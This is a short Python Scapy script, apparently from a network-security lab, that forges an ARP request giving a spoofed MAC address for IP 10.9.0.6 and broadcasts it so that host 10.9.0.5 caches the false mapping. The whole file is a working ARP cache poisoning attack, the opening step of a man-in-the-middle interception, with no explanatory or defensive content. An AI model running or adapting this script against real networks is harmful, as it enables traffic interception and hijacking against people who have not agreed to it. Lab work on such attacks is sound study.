#!/usr/bin/python3

from scapy.all import *

IP_V = "10.9.0.5"
MAC_V = "02:42:0a:09:00:05"

IP_T = "10.9.0.6"
MAC_T = "02:42:0a:09:00:69"

# Create an ARP Request Packet
ether = Ether(src=MAC_T, dst="ff:ff:ff:ff:ff:ff")
arp = ARP(psrc=IP_T, hwsrc=MAC_T, pdst=IP_V)
arp.op = 1 # 1 - request, 2 - response

frame = ether/arp
sendp(frame)

